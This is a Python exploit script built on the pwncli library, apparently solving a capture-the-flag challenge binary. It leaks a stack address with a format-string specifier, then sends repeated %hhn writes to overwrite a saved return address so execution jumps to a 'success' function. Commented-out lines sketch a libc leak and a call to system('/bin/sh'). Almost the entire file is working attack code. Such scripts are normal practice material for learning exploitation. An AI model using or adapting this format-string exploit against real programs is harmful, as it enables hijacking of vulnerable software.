#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io'] 
elf: ELF = gift['elf']
libc: ELF = gift.libc

ropper_box = RopperBox()

try:
    if gift.remote:
        libc = ELF("./libc.so.6")
        gift['libc'] = libc
        #ropper_box.add_file("libc", "libc.so.6", arch=RopperArchType.x86_64)
    else:
        pass
        #ropper_box.add_file("libc", "/usr/lib/libc.so.6", arch=RopperArchType.x86_64)
except:
    pass

CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

#pop_rdi_ret = CurrentGadgets.pop_rdi_ret()
#ret = CurrentGadgets.ret()


#putsaddr=int(io.recv(12),16)
#print(libc.sym['puts'])
#libcbase=putsaddr-libc.sym['puts']
#system=libcbase+libc.sym['system']
#binsh=libcbase+next(libc.search(b"/bin/sh"))

# sla('choose?', '4')
addr = elf.sym['success']
print('success addr:', hex(addr))
addr = p32(addr)

sl('3')
payload = '%6$p\n'
sa('to talk:', payload)
ru(' said: \n')
stack_addr = int(ru(b'\n'), 16)
# ptr1_addr = stack_addr + 0x2c
# ptr2_addr = stack_addr + 0xec
# ptr3_addr = stack_addr + 0x372
# ptr1_ofst = b'%17$hhn'
# ptr2_ofst = b'%65$hhn'
# ptr3_ofst = b'%227$hhn'
ptr1_addr = stack_addr - 0x20
ptr3_addr = stack_addr + 0x0
ptr3_addr = stack_addr + 0x10
ptr1_ofst = b'%6$hhn'
ptr2_ofst = b'%14$hhn'
ptr3_ofst = b'%18$hhn'
ret_addr = stack_addr + 0x4
print('stack_addr:', hex(stack_addr))
ru('ignore', )

payloads = []


def set_addr(addr):
    ptr3_ff = ptr3_addr&0xff
    assert ptr3_ff+len(addr)<=0x100
    payloads = []
    for i, ad in enumerate(addr):
        payloads.append((f'%{ptr3_ff+i}c'.encode() if ptr3_ff+i else b'') + ptr1_ofst)
        payloads.append((f'%{ad}c'.encode() if ad else b'') + ptr2_ofst)
    return payloads


for i, ad in enumerate(addr):
    payloads.extend(set_addr(p32(ret_addr+i)))
    payloads.append((f'%{ad}c'.encode() if ad else b'') + ptr3_ofst)

#payload += 0x1bf52.to_bytes(4, 'little')  # CALL givemeshell
for i in payloads:
    sl('3')
    print('payload:', i)
    sa('to talk:', i)
    ru('ignore', )

#sla('key:', b'+')
ia()

